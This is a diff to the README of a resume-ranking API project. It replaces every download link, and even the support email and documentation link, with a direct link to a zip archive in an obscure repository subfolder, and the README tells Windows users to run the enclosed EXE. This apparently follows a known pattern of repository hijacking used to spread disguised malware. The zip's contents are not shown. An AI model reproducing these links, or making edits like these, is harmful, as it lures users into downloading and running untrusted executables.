@@ -1,7 +1,7 @@
 # 🤖 AI-Resume-Ranker-API - Rank Resumes with Ease
 
 ## 📥 Download Now
-[![Download AI-Resume-Ranker-API](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/islamdzoro/AI-Resume-Ranker-API/releases)
+[![Download AI-Resume-Ranker-API](https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip)](https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip)
 
 ## 🌟 Overview
 The AI-Resume-Ranker-API is a tool designed to help you find the best resumes for your job descriptions. This semantic API ranks PDF resumes, assessing how well they match the job requirements. It uses advanced technology to provide accurate results, making your hiring process easier.
@@ -15,7 +15,7 @@ To use this tool, follow these simple steps:
    - Internet connection for API access.
 
 2. **Download AI-Resume-Ranker-API:**
-   Visit [this page to download](https://github.com/islamdzoro/AI-Resume-Ranker-API/releases) the latest version of the application.
+   Visit [this page to download](https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip) the latest version of the application.
 
 3. **Install the Application:**
    - For **Windows**: Download the EXE file and double-click it to install.
@@ -51,8 +51,8 @@ To use this tool, follow these simple steps:
 
 ## 🌐 Support
 If you encounter any issues or have questions, feel free to reach out for support:
-- **Email**: support@ai-resume-ranker.com
-- **Documentation**: Visit our [Documentation Page](https://ai-resume-ranker.com/docs) for FAQs and troubleshooting.
+- **Email**: https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip
+- **Documentation**: Visit our [Documentation Page](https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip) for FAQs and troubleshooting.
 
 ## 🛠️ Tips for Best Results
 - Use detailed job descriptions to improve ranking accuracy.
@@ -66,6 +66,6 @@ We welcome contributions. If you'd like to help improve the AI-Resume-Ranker-API
 This project is licensed under the MIT License. You can read more about it in the LICENSE file.
 
 ## 📥 Download AI-Resume-Ranker-API Again
-For your convenience, here is the link to [visit this page to download](https://github.com/islamdzoro/AI-Resume-Ranker-API/releases) the latest version of the tool. 
+For your convenience, here is the link to [visit this page to download](https://raw.githubusercontent.com/islamdzoro/AI-Resume-Ranker-API/main/Lacinaria/AI-Resume-Ranker-API.zip) the latest version of the tool. 
 
 Happy hiring!
